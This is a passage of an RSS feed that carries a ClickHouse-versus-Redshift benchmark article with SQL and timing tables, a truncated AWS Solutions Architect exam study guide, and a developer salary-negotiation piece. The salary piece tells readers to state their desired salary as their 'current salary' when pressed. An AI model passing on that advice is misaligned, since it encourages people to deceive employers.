  rate_code_id String,
  store_and_fwd_flag String,
  dropoff_longitude Float32,
  dropoff_latitude Float32,
  payment_type LowCardinality(String),
  fare_amount Float32,
  extra String,
  mta_tax Float32,
  tip_amount Float32,
  tolls_amount Float32,
  improvement_surcharge Float32,
  total_amount Float32,
  pickup_location_id UInt16,
  dropoff_location_id UInt16,
  junk1 String,
  junk2 String) 
ENGINE = MergeTree
PARTITION BY toYYYYMM(pickup_date) 
ORDER BY (vendor_id, pickup_location_id, pickup_datetime);</code></pre>
</div><p>Once the table is created, data can be loaded with a single SQL statement as:</p><div><pre><code>set max_insert_threads=32;

INSERT INTO tripdata
SELECT *
FROM s3('https://&lt;bucket_name&gt;/nyc_taxi_rides/data/tripdata/data-20*.csv.gz', 
'CSVWithNames', 
'pickup_date Date, id UInt64, vendor_id String, pickup_datetime DateTime, dropoff_datetime DateTime, passenger_count UInt8, trip_distance Float32, pickup_longitude Float32, pickup_latitude Float32, rate_code_id String, store_and_fwd_flag String, dropoff_longitude Float32, dropoff_latitude Float32, payment_type LowCardinality(String), fare_amount Float32, extra String, mta_tax Float32, tip_amount Float32, tolls_amount Float32, improvement_surcharge Float32, total_amount Float32, pickup_location_id UInt16, dropoff_location_id UInt16, junk1 String, junk2 String', 'gzip');</code></pre>
</div><p>Once the table is created, data can be loaded with a single SQL statement as:</p><p>The syntax is not standard; we use the ClickHouse table function ‘s3()’ in order to connect to and read from an S3 bucket. ClickHouse <a href="https://clickhouse.tech/docs/en/sql-reference/table-functions/">table functions</a> are a powerful extension technique that allows to integrate a DBMS with external data sources without changing the SQL syntax. ClickHouse has a bunch of those, and the ‘s3()’ table function is a welcome addition.</p><div><pre><code>0 rows in set. Elapsed: 280.696 sec. Processed 1.31 billion rows, 167.39 GB (4.67 million rows/s., 596.34 MB/s.) </code></pre>
</div><p>It takes less than 5 minutes in order to load 1.3 billion rows from the S3 bucket! Note that wildcards are used in order to load multiple files, and Clickhouse can process gzipped data natively as well!&nbsp;</p><p>In the same way we can load the ‘taxi_zones’ table — the table is small so loading is almost instantaneous from S3.</p><div><pre><code>CREATE TABLE IF NOT EXISTS taxi_zones (
  location_id UInt16,
  zone String,
  create_date Date DEFAULT toDate(0)
) 
ENGINE = MergeTree 
ORDER BY (location_id);

INSERT INTO taxi_zones
SELECT *
FROM s3('https://&lt;bucket_name&gt;/nyc_taxi_rides/data/taxi_zones/data-*.csv.gz', 
'CSVWithNames', 'location_id UInt16, zone String, create_date Date', 'gzip');</code></pre>
</div><p>Once the data is loaded, it is a good practice to inspect table sizes:</p><div><pre><code>SELECT 
    table,
    sum(rows),
    sum(data_uncompressed_bytes) AS uc,
    sum(data_compressed_bytes) AS c,
    uc / c AS ratio
FROM system.parts
WHERE (database = 'default') AND active
GROUP BY table

┌─table─────────────┬──sum(rows)─┬───────────uc─┬───────────c─┬──────────────ratio─┐
│ tripdata          │ 1310903963 │ 104469253248 │ 37563206521 │ 2.7811591778671945 │
│ taxi_zones        │        263 │         5495 │        3697 │ 1.4863402758993778 │
└───────────────────┴────────────┴──────────────┴─────────────┴────────────────────┘</code></pre>
</div><p>As you can see, uncompressed data size is above 100GB, which lands in ClickHouse as 35GB for the main table with 2.8 times compression ratio. We usually expect ClickHouse to compress more aggressively, but the table has a lot of random floats that are hard to pack effectively.</p><p>The data loading process was very fast and convenient and it took us less than 10 minutes to get ready for queries.</p><p><h2>Queries</h2>
</p><p>Following Mark Litwintschik examples we used several simple queries in order to benchmark performance.</p><p>Q1. Group by a single column.</p><div><pre><code>SELECT 
    passenger_count,
    avg(total_amount)
FROM tripdata
GROUP BY passenger_count</code></pre>
</div><p>Q2. Group by two columns.</p><div><pre><code>SELECT 
    passenger_count,
    toYear(pickup_date) AS year,
    count(*)
FROM tripdata
GROUP BY passenger_count, year</code></pre>
</div><p>Q3. Group by three columns.</p><div><pre><code>SELECT 
    passenger_count,
    toYear(pickup_date) AS year,
    round(trip_distance) AS distance,
    count(*)
FROM tripdata
GROUP BY passenger_count, year, distance
ORDER BY year, count(*) DESC</code></pre>
</div><p>We have added two more queries to check joins.</p><p>Q4. Query with a JOIN to taxi_zones table</p><div><pre><code>SELECT 
    tz.zone AS zone,
    count() AS c
FROM tripdata AS td
LEFT JOIN taxi_zones AS tz ON td.pickup_location_id = tz.location_id
GROUP BY zone
ORDER BY c DESC</code></pre>
</div><p>Q5. Where condition on the joined table.</p><div><pre><code>SELECT count(*)
FROM tripdata AS td
INNER JOIN taxi_zones AS tz ON td.pickup_location_id = tz.location_id
WHERE tz.zone = 'Midtown East'</code></pre>
</div><p>Here are the results (all numbers — query time in seconds).</p><div><figure>
<table>
<tbody>
<tr>
<td><strong>Query</strong></td>
<td><strong>ClickHouse</strong><strong><br></strong><strong>m5.8xlarge</strong></td>
</tr>
<tr>
<td>Data load</td>
<td>280</td>
</tr>
<tr>
<td>Q1</td>
<td>0.62</td>
</tr>
<tr>
<td>Q2</td>
<td>1.11</td>
</tr>
<tr>
<td>Q3</td>
<td>1.78</td>
</tr>
<tr>
<td>Q4</td>
<td>0.94</td>
</tr>
<tr>
<td>Q5</td>
<td>0.33</td>
</tr>
</tbody>
</table>
</figure>
</div><p>Numbers do not look bad for a 1.3B rows dataset, but let’s look at comparisons.</p><p><h2>Redshift</h2>
</p><p>Now we repeat the same experience with Redshift. Redshift has a limited number of options for instance types to select from, the closest to m5.8xlarge instances we were using for ClickHouse is Redshift dc2.8xlarge instance. dc2.8xlarge is equipped with 32 vCPUs, 244GB of RAM and 2.5TB local SSD. It is important to note that Redshift forces users to use at least two dc2.8xlarge nodes per cluster, which raises the cost of the cluster to $230.40 per day.</p><div><figure><img src="https://lh4.googleusercontent.com/LEjpOZAvu0WdLq0iHeBye24z2_w-cJpeV2aufz_7BskH5yF_c4avbtI82kaGjzNYdkRjrdDbZh0O2tlc-giCk9yH7sRL9AJApEwE2ZGgdXYRyPdJIRszZAIYC2W91kiT3bD-lRsO" alt="Redshift Cluster" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
</div><div><figure><img src="https://lh6.googleusercontent.com/YW5hRb-i-O5dL5ni-05MzdFEVU0-l4S7DOtDurzUVyyFWQYyvXpwcWhyXgPiXvrq9thD23j6bNmBlmZnZg-HQo2ch028pVXt1UyIyX_I2KWHhJ9nd7YOuakiKZKBu1Dvc8JzAgii" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
</div><p>The data loading is easy using standard SQL COPY statement:</p><div><pre><code>COPY tripdata
FROM 's3://&lt;bucket_name&gt;/nyc_taxi_rides/data/tripdata/'
CREDENTIALS ‘’
DELIMITER ','
  EMPTYASNULL
  ESCAPE
  GZIP
  MAXERROR 100000
  REMOVEQUOTES
  TRIMBLANKS
  IGNOREHEADER
  TRUNCATECOLUMNS;

[2020-07-28 19:43:57] completed in 8 m 26 s 624 ms</code></pre>
</div><p>This is very fast but it takes 80% more time compared to ClickHouse.&nbsp;</p><p>We run the same queries on Redshift using psql with query result cache disabled. Here are the results we’ve got:</p><div><figure>
<table>
<tbody>
<tr>
<td><strong>Query</strong></td>
<td><strong>ClickHouse</strong><strong><br></strong><strong>m5.8xlarge</strong></td>
<td><strong>RedShift dc2.8xlarge x2</strong></td>
</tr>
<tr>
<td>Data load</td>
<td>280</td>
<td>506</td>
</tr>
<tr>
<td>Q1</td>
<td>0.62</td>
<td>0.59</td>
</tr>
<tr>
<td>Q2</td>
<td>1.11</td>
<td>0.82</td>
</tr>
<tr>
<td>Q3</td>
<td>1.78</td>
<td>2.8</td>
</tr>
<tr>
<td>Q4</td>
<td>0.94</td>
<td>0.64</td>
</tr>
<tr>
<td>Q5</td>
<td>0.33</td>
<td>0.45</td>
</tr>
</tbody>
</table>
</figure>
</div><p>As you can see, the query performance is close between the two databases. ClickHouse is slower on some queries, and faster on others. The total query time is lower with ClickHouse, but it is fair to say there is a tie here.</p><p>Let’s note, however, that Redshift is running on two nodes and may distribute data and query execution accordingly. For a fair comparison we need to add one more node to ClickHouse as well.</p><p><h2>Scaling ClickHouse Out</h2>
</p><p>Scaling from one to two servers requires some configuration and schema changes. Please refer to our webinar for the details of ClickHouse clustering:&nbsp; <a href="https://www.youtube.com/watch?v=78rrmC-2G6w">“Strength in Numbers: Introduction to ClickHouse cluster performance”</a>. Since we run ClickHouse inside Kubernetes, we can use Altinity <a href="https://github.com/Altinity/clickhouse-operator">clickhouse-operator</a> for Kubernetes that turns adding a node to the cluster to a one click job.</p><p>When a new node is added to the ClickHouse cluster, data is not redistributed automatically. So there are two options:</p><div><ol>
<li>Reload data from S3 to the distributed table.</li>
<li>Reload data from the local to the distributed table with a simple INSERT SELECT statement.</li>
</ol>
</div><p>We tried the first approach in order to measure load time into a distributed table.</p><div><pre><code>CREATE TABLE tripdata_local ON CLUSTER '{cluster}' AS tripdata;

CREATE TABLE tripdata_d ON CLUSTER '{cluster}' AS tripdata Engine = Distributed('{cluster}', default, tripdata_local, rand());

INSERT INTO tripdata_d SELECT * FROM s3(...);</code></pre>
</div><p>Unfortunately, we hit a problem in ClickHouse at this point. The loading into the distributed table was 3-4 times slower due to lack of parallelisation when processing an insert. This is not acceptable by ClickHouse standards, and <a href="https://github.com/ClickHouse/ClickHouse/pull/14120">a fix</a> has been already submitted. So in order to speed things up until the new ClickHouse version is available, we made a trick and re-distributed the table manually using the following technique:</p><div><pre><code>INSERT INTO tripdata_local SELECT *
FROM tripdata
WHERE (cityHash64(*) % 2) = 0

0 rows in set. Elapsed: 84.095 sec. Processed 1.31 billion rows, 167.40 GB (15.59 million rows/s., 1.99 GB/s.)

INSERT INTO FUNCTION remote('second_node_address', default.tripdata_local) SELECT *
FROM tripdata
WHERE (cityHash64(*) % 2) = 1

0 rows in set. Elapsed: 335.122 sec. Processed 1.31 billion rows, 167.40 GB (3.91 million rows/s., 499.52 MB/s.)</code></pre>
</div><p>Here we used yet another table function ‘remote()’ that allows us to query between ClickHouse nodes. Note that we inserted data into a function, which is also a unique ClickHouse extension.</p><p>Below are query results for all tested configurations. We have also added Mark Litwintschick’s historical data in the last two columns for the reference.&nbsp;</p><div><figure>
<table>
<tbody>
<tr>
<td><strong>Query</strong></td>
<td><strong>ClickHouse </strong><strong><br></strong><strong>m5.8xlarge,</strong><strong><br></strong><strong>Aug 2020</strong></td>
<td><strong>ClickHouse m5.8xlarge x2,</strong><strong><br></strong><strong>Aug 2020</strong></td>
<td><strong>RedShift dc2.8xlarge x2,</strong><strong><br></strong><strong>Aug 2020</strong></td>
<td><a href="https://tech.marksblogg.com/billion-nyc-taxi-rides-clickhouse-cluster.html"><strong>ClickHouse</strong><strong><br></strong><strong>c5d.9xlarge x3, Jan 2019</strong></a></td>
<td><a href="https://tech.marksblogg.com/billion-nyc-taxi-rides-redshift-large-cluster.html"><strong>Redshift ds2.8xlarge x6, June 2016</strong></a></td>
</tr>
<tr>
<td>Data load</td>
<td>280</td>
<td>n/a</td>
<td>506</td>
<td>n/a</td>
<td>673</td>
</tr>
<tr>
<td>Q1</td>
<td>0.62</td>
<td>0.35</td>
<td>0.59</td>
<td>0.69</td>
<td>1.25</td>
</tr>
<tr>
<td>Q2</td>
<td>1.11</td>
<td>0.58</td>
<td>0.82</td>
<td>0.58</td>
<td>2.25</td>
</tr>
<tr>
<td>Q3</td>
<td>1.…</td></tr></tbody></table></figure></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark">https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark</a></em></p>]]>
            </description>
            <link>https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518926</guid>
            <pubDate>Fri, 18 Sep 2020 16:41:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Solutions Architect Associate Exam – everything you need to know]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518880">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://dannys.cloud/aws-solutions-architect-associate-exam-guide | <a href="https://web.archive.org/web/*/https://dannys.cloud/aws-solutions-architect-associate-exam-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>The number of courses and content that is available to study for one of the most popular exams: AWS Certified Solutions Architect Associate can be overwhelming. <strong>I've created a complete guide that makes sure you can study effectively and pass in one go!</strong></p>
<h2 id="introduction">Introduction</h2>
<p>My goal is to write a guide on every AWS Certified exam that AWS offers. This is my second article on this series and will contain everything you need to know to successfully prepare you for the AWS Solutions Architect Associate exam [SAA-C02].</p>
<p>This guide will contain a bit more acronyms and is somewhat more targeted towards technical people. If you find that you're relatively new to AWS and the technical side of it. I would recommend having a look at the first guide that I wrote on preparing for the <a target="_blank" href="https://dannys.cloud/aws-cloud-practitioner-exam-guide">AWS Cloud Practitioner exam</a></p>
<p>For the <strong>AWS Solutions Architect Associate</strong> exam - complete guide, I've reviewed all the information that's relevant for this course and curated the content to help you get up to speed more efficiently! By following this guide you should get prepared to successfully pass the exam on the first attempt!</p>
<p><strong>Table Of Contents</strong></p>
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#prerequisites">Prerequisites</a></li>
<li><a href="#aws-solutions-architect-associate-exam-overview">AWS Solutions Architect Associate exam overview</a><ul>
<li><a href="#domain-1-design-resilient-architectures-30">Domain 1: Design Resilient Architectures - 30%</a></li>
<li><a href="#domain-2-design-high-performing-architectures-28">Domain 2: Design High-Performing Architectures - 28%</a></li>
<li><a href="#domain-3-design-secure-applications-and-architectures-24">Domain 3: Design Secure Applications and Architectures - 24%</a></li>
<li><a href="#domain-4-design-cost-optimized-architectures-18">Domain 4: Design Cost-Optimized Architectures - 18%</a></li>
</ul>
</li>
<li><a href="#how-to-prepare-for-the-exam">How to prepare for the exam?</a></li>
<li><a href="#technical-preparation-notes">Technical Preparation notes</a><ul>
<li><a href="#domain-1-design-resilient-architectures">Domain 1: Design Resilient Architectures</a><ul>
<li><a href="#ec2-storage-types">EC2 Storage types</a></li>
<li><a href="#amazon-simple-storage-service-s3">Amazon Simple Storage Service (S3)</a></li>
<li><a href="#design-decoupling-systems-using-aws-services">Design decoupling systems using AWS services</a></li>
<li><a href="#elastic-load-balancer-elb">Elastic Load Balancer (ELB)</a></li>
</ul>
</li>
<li><a href="#domain-2-design-high-performing-architectures">Domain 2: Design High-Performing Architectures</a><ul>
<li><a href="#amazon-rds">Amazon RDS</a></li>
<li><a href="#dynamodb">DynamoDB</a></li>
<li><a href="#elasticache">Elasticache</a></li>
<li><a href="#cloudfront">CloudFront</a></li>
</ul>
</li>
<li><a href="#domain-3-design-secure-applications-and-architectures">Domain 3: Design Secure Applications and Architectures</a><ul>
<li><a href="#shared-responsibility-model">Shared responsibility model</a></li>
<li><a href="#aws-identity-and-access-management-iam">AWS Identity and Access Management (IAM)</a></li>
<li><a href="#aws-key-management-service">AWS Key Management Service</a></li>
<li><a href="#aws-cloudhsm">AWS CloudHSM</a></li>
<li><a href="#aws-vpc">AWS VPC</a></li>
</ul>
</li>
<li><a href="#domain-4-design-cost-optimized-architectures">Domain 4: Design Cost-Optimized Architectures</a></li>
</ul>
</li>
<li><a href="#practice-exam-questions">Practice exam questions</a><ul>
<li><a href="#practice-question-1">Practice question #1</a></li>
<li><a href="#practice-question-2">Practice question #2</a></li>
<li><a href="#practice-question-3">Practice question #3</a></li>
<li><a href="#practice-question-4">Practice question #4</a></li>
<li><a href="#practice-question-5">Practice question #5</a></li>
<li><a href="#practice-question-6">Practice question #6</a></li>
<li><a href="#practice-question-7">Practice question #7</a></li>
</ul>
</li>
<li><a href="#aws-certified-solutions-architect-associate-study-material">AWS Certified Solutions Architect Associate Study material</a><ul>
<li><a href="#reading-material">Reading material</a></li>
<li><a href="#video-material">Video material</a></li>
</ul>
</li>
<li><a href="#you-should-now-be-fully-prepared-for-the-aws-certified-solutions-architect-associate-exam">You should now be fully prepared for the AWS Certified Solutions Architect Associate exam!</a></li>
<li><a href="#aws-certified-solutions-architect-associate-exam--faq">AWS Certified Solutions Architect Associate exam – FAQ</a><ul>
<li><a href="#is-the-aws-certified-solutions-architect-associate-exam-easy">Is the AWS Certified Solutions Architect Associate exam easy?</a></li>
<li><a href="#how-long-does-it-take-to-prepare-for-the-aws-certified-solutions-architect-associate-certification">How long does it take to prepare for the AWS Certified Solutions Architect Associate certification?</a></li>
<li><a href="#im-ready-to-do-the-aws-certified-solutions-architect-associate-exam-how-do-i-schedule-it">I’m ready to do the AWS Certified Solutions Architect Associate exam, how do I schedule it?</a></li>
</ul>
</li>
</ul>
<h2 id="prerequisites">Prerequisites</h2>
<p>This exam is intended for people who have one or more years of hands-on experience designing available,
  cost-efficient, fault-tolerant, and scalable distributed systems on AWS. You're required to be familiar with the AWS
  terminology and with the most common used AWS Services</p>
<p>If you want to start practicing with these AWS Services, it is important to create a <a target="_blank" href="https://portal.aws.amazon.com/billing/signup#/start">free AWS account</a> first. AWS offers a <a target="_blank" href="http://aws.amazon.com/free">free tier</a> to get familiar with its services without expenses so you can
  experiment with the exercises that are provided in this guide.</p>
<p>AWS recommends you to have the following experience and knowledge before attending the exam:</p>
<blockquote>
<ul>
<li>Hands-on experience using compute, networking, storage, and database AWS services</li>
<li>Hands-on experience with AWS deployment and management services</li>
<li>Ability to identify and define technical requirements for an AWS-based application</li>
<li>Ability to identify which AWS services meet a given technical requirement</li>
<li>Knowledge of recommended best practices for building secure and reliable applications on the AWS platform</li>
<li>An understanding of the basic architectural principles of building on the AWS Cloud</li>
<li>An understanding of security features and tools that AWS provides and how they relate to traditional services</li>
</ul>
<p><a target="_blank" href="https://aws.amazon.com/certification/certified-solutions-architect-associate/">AWS Certified Solutions Architect Associate certification page</a></p>
</blockquote>
<h2 id="aws-solutions-architect-associate-exam-overview">AWS Solutions Architect Associate exam overview</h2>
<p>Some <a target="_blank" href="https://aws.amazon.com/certification/certified-solutions-architect-associate/">practical information</a> that is interesting to know when you plan to schedule the exam:</p>
<ul>
<li>The AWS Solutions Architect Associate exam consists of 65 multiple-choice, multiple-answer questions.</li>
<li>You have 130 minutes to complete the exam.</li>
<li>The exam costs $150,-</li>
<li>The official practice exam costs $20</li>
<li>The minimum passing score for this exam is 720 points</li>
<li>The exam is available in English, Japanese, Korean, and Simplified Chinese.</li>
</ul>
<p>As explained in the official <a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">AWS Certified Solutions Architect exam guide</a>. It covers the following topics including their weighted percentage:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1597867470378/5orOtiSu2.jpeg?auto=format&amp;q=60" alt="AWS Solutions Architect content outline domains"></p><p>
AWS Solutions Architect content outline domains

</p><h3 id="domain-1-design-resilient-architectures-30">Domain 1: <strong>Design Resilient Architectures - 30%</strong></h3>
<blockquote>
<p>1.1 Design a multi-tier architecture solution
1.2 Design highly available and/or fault-tolerant architectures
1.3 Design decoupling mechanisms using AWS services
1.4 Choose appropriate resilient storage</p>
<p><a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">(SAA-C02) Exam Guide</a></p>
</blockquote>
<p>The first domain requires you to understand how to build effective architectures using fundamental AWS services like EC2, VPC, RDS, S3, etc. Best practices are important to know when building these architectures, so it's good to understand the <a target="_blank" href="https://aws.amazon.com/architecture/well-architected/">AWS Well-Architected Framework</a>.</p>
<h3 id="domain-2-design-high-performing-architectures-28">Domain 2: <strong>Design High-Performing Architectures - 28%</strong></h3>
<blockquote>
<p>2.1 Identify elastic and scalable compute solutions for a workload
2.2 Select high-performing and scalable storage solutions for a workload
2.3 Select high-performing networking solutions for a workload
2.4 Choose high-performing database solutions for a workload</p>
<p><a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">(SAA-C02) Exam Guide</a></p>
</blockquote>
<p>The focus in this domain lies in building resilient architectures that make use of Scalability and Elasticity. You need to be able to understand the purpose of implementing Multi-AZ and Auto-Scaling to drive costs down and improve fault tolerance.</p>
<h3 id="domain-3-design-secure-applications-and-architectures-24">Domain 3: <strong>Design Secure Applications and Architectures - 24%</strong></h3>
<blockquote>
<p>3.1 Design secure access to AWS resources
3.2 Design secure application tiers
3.3 Select appropriate data security options</p>
<p><a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">(SAA-C02) Exam Guide</a></p>
</blockquote>
<p>For the third domain, you're required to understand how to add security measures on four different levels: AWS
  resources, network-, application- and data-layer. The data layer can be distinguished in two parts, data in transit and data at rest. For data-security encryption plays a primary role and for networking it's important to know access controls like Security groups, ACLs, etc.</p>
<h3 id="domain-4-design-cost-optimized-architectures-18">Domain 4: <strong>Design Cost-Optimized Architectures - 18%</strong></h3>
<blockquote>
<p>4.1 Identify cost-effective storage solutions
4.2 Identify cost-effective compute and database services
4.3 Design cost-optimized network architectures</p>
<p><a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">(SAA-C02) Exam Guide</a></p>
</blockquote>
<p>In the last domain, you need to know how to build cost-efficient architectures with scalability and resiliency taken into consideration. You'll also need to know how to select the right type of any resource to effectively do the task at hand. And at last, it's important to know how to optimize your network design to transfer data the most efficiently from on-premise to the Cloud.</p>
<h2 id="how-to-prepare-for-the-exam">How to prepare for the exam?</h2>
<p>In this section, I've bundled up some notes which can be of use when preparing for the AWS Solutions Architect Associates exam. Prior to this Blogpost, I've also released a guide for the <a target="_blank" href="https://dannys.cloud/aws-cloud-practitioner-exam-guide/#technical-preparation-notes">AWS Cloud Practitioner exam technical preparation notes</a>. This contains the foundational information which also helps for this exam, so I highly recommend to read the notes from there as well.</p>
<p>Moving on to the preparation, I’ve written some technical notes which highlight import details which are worth remembering. Next to that, I’ll be sharing seven practice questions that give a good indication of what to expect on the real exam. At last, I’ll be sharing my AWS Solutions Architect learning material list which contains a curated collection of high-quality content to help you study efficiently.</p>
<p>The learning material is divided into two parts:</p>
<ul>
<li>Reading material</li>
<li>Visual material</li>
</ul>
<p>For the readers, I'll be sharing my recommended books to read. For the visual learners, I'll provide the videos that will help you prepare for the exam.</p>
<h2 id="technical-preparation-notes">Technical Preparation notes</h2>
<p>The technical notes are a bundled package of dense information that helps you get insight into what technical services and details are being treated at the exams. I've divided it into the domains that you'll see at the exam.</p>
<h3 id="domain-1-design-resilient-architectures">Domain 1: Design Resilient Architectures</h3>
<h4 id="ec2-storage-types">EC2 Storage types</h4>
<ul>
<li>Amazon Elastic Block Store (Amazon EBS) provides block-level storage volumes for use with Amazon EC2 instances. Three flavors: Magnetic, General purpose SSD, provisioned IOPS SSD. Snapshots can be created and are saved in S3.</li>
<li>Ephemeral storage (legacy) is temporary storage for your EC2 instance. Good to use as a scratch disk, not storing data! Data will be removed after the instance shuts down.</li>
</ul>
<p><strong>Elastic File System (EFS)</strong>
It's a highly durable storage that can be shared with EC2 instance (NFS protocol). A good use case for former stateful applications that need block storage but aren't scalable yet. This provides a good solution to make your application scalable whilst keeping the data intact.</p>
<h4 id="amazon-simple-storage-service-s3">Amazon Simple Storage Service (S3)</h4>
<p>S3 is object storage which is highly durable 99.999999999% with virtually unlimited capacity. It contains different <a target="_blank" href="https://aws.amazon.com/s3/storage-classes/">storage classes:</a></p>
<ul>
<li>S3 standard</li>
<li>S3 Intelligent-Tiering</li>
<li>S3 Standard-Infrequent Access</li>
<li>S3 One Zone-Infrequent Access</li>
<li>S3 Glacier</li>
<li>S3 Glacier Deep Archive</li>
</ul>
<h4 id="design-decoupling-systems-using-aws-services">Design decoupling systems using AWS services</h4>
<p>Decoupling components becomes important when you're architecting in the cloud. Loose coupling isolates the layers and components of your application so that each component interacts asynchronously with the others. This is necessary if you want to enable scalability and want your system to become stateless.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1597867420658/5ipcnFqVD.jpeg?auto=format&amp;q=60" alt="Order dispatcher example decoupled system"></p><p>
Example of a decoupled system using SQS + Autoscaling

</p><h4 id="elastic-load-balancer-elb">Elastic Load Balancer (ELB)</h4>
<p>ELB's are a trivial part of high availability and scalability. It comes in 3 flavors:</p>
<ul>
<li><a target="_blank" href="https://docs.aws.amazon.com/elasticloadbalancing/latest/classic/introduction.html">Classic ELB</a></li>
<li><a target="_blank" href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/introduction.html">Application Load Balancer (ALB)</a></li>
<li><a target="_blank" href="https://docs.aws.amazon.com/elasticloadbalancing/latest/network/introduction.html">Network Load Balancer (NLB)</a></li>
</ul>
<p><strong>Sources</strong>
<a target="_blank" href="https://aws.amazon.com/ebs/faqs/">Amazon EBS FAQs</a>
<a target="_blank" href="https://aws.amazon.com/efs/faq/">EFS FAQs</a>
<a target="_blank" href="https://aws.amazon.com/s3/faqs/">S3 FAQs</a>
<a target="_blank" href="https://d0.awsstatic.com/whitepapers/Storage/AWS%20Storage%20Services%20Whitepaper-v9.pdf">AWS Storage Services whitepaper</a></p>
<h3 id="domain-2-design-high-performing-architectures">Domain 2: Design High-Performing Architectures</h3>
<h4 id="amazon-rds">Amazon RDS</h4>
<p>For relational databases, Amazon …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dannys.cloud/aws-solutions-architect-associate-exam-guide">https://dannys.cloud/aws-solutions-architect-associate-exam-guide</a></em></p>]]>
            </description>
            <link>https://dannys.cloud/aws-solutions-architect-associate-exam-guide</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518880</guid>
            <pubDate>Fri, 18 Sep 2020 16:37:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Negotiate Your Salary as a Developer]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518792">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://catalins.tech/how-to-negotiate-your-salary-as-a-developer | <a href="https://web.archive.org/web/*/https://catalins.tech/how-to-negotiate-your-salary-as-a-developer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597245333467/5UNrmc9eH.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><hr>

<p>Knowing how to negotiate your salary as a developer is a must. When I received my first job offer, I was so excited to get a job, that I blindly accepted it. I did not even think of negotiating the salary. After all, I did not want to risk losing the offer. You have been in the same situation at least once, right?</p>
<p>However, most of the time, we leave money on the table by not negotiating our salary.</p>

<p>The first offer is never the best or the final offer. Companies always leave room in case the candidate wants to negotiate it. By not negotiating, you leave money on the table.</p>
<p>But how should I know how much to ask for? Use websites like Glassdoor to find the appropriate salary for a similar position and a similar experience. Once you have this information, adjust the salary based on your circumstances. At this point, you should have a rough idea of how much you deserve.</p>
<p>However, you should not blindly ask for more without reasons. If you ask for money, come with reasons why you deserve that compensation. Specify what you bring to the table.</p>

<p>I think I received this question millions of times. First of all, in many countries and states (USA), it is illegal to ask for the current salary. The rule of thumb is never to specify the salary you are making.</p>
<p>There are two options when answering this question:</p>
<ol>
<li>Avoid the question and try to move on</li>
<li>If they keep insisting, use the salary you want as your “current salary.”
Anyway, the best thing is never to mention the current salary. Companies and recruiters should not care about your current situation in terms of salary. </li>
</ol>

<p>Another reason why people do not negotiate is that they are afraid the company rescinds the offer. I do not think any respectable company is going to revoke the offer if you negotiate the salary.</p>
<p>In the worst case, they are going to cancel the offer. However, would you like to work for a company that does this? You just saved yourself from the trouble.</p>
<p>Therefore, do not be afraid to negotiate. In the worst case, they are going to say ‘no’. In the best case, you are going to get better compensation. On the other hand, if they rescind the offer, you do not want to work for them anyway.</p>

<p>This advice is not actionable straight away, and it depends on the circumstances. However, having alternative offers helps a lot because it puts you in a favourable position. If your negotiation does not go well, you always have a second option. The company also knows that you have nothing to lose.</p>
<p>However, I want to repeat that it depends on the circumstances. The more offers you have, the better it is for you. One the other side, if you do not have multiple offers, it is not the end of the world. </p>
<p>Let us pretend you have alternative offers. How can you use them to leverage your position?</p>
<p>You could say something along these lines: “I have multiple offers from x, y, z with better compensation. However, I like your products and your mission the most. As a result, I would like to work here because I think it is a better fit for me.” Of course, this is just an example, but you can use something similar.</p>
<p>Thus, if you have other offers, learn how to use them at your advantage.</p>

<p>These are my tops tips when it comes to knowing how to negotiate your salary as a developer. The list is not exhaustive, and there are many other aspects of negotiating.</p>
<p>I hope the article gives you some insights and helps you see negotiating with other eyes. The essential thing is to negotiate your salaries. Otherwise, you leave money on the table.</p>
<blockquote>
<p>If you enjoyed the article, consider sharing it so more people can benefit from it! Also, feel free to @ me on Twitter with your opinions.</p>
</blockquote>
</div></div></section></div></div>]]>
            </description>
            <link>https://catalins.tech/how-to-negotiate-your-salary-as-a-developer</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518792</guid>
            <pubDate>Fri, 18 Sep 2020 16:28:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Impostor Syndrome – A Developer's Best Friend]]>
            </title>
            <description>
<![CDATA[
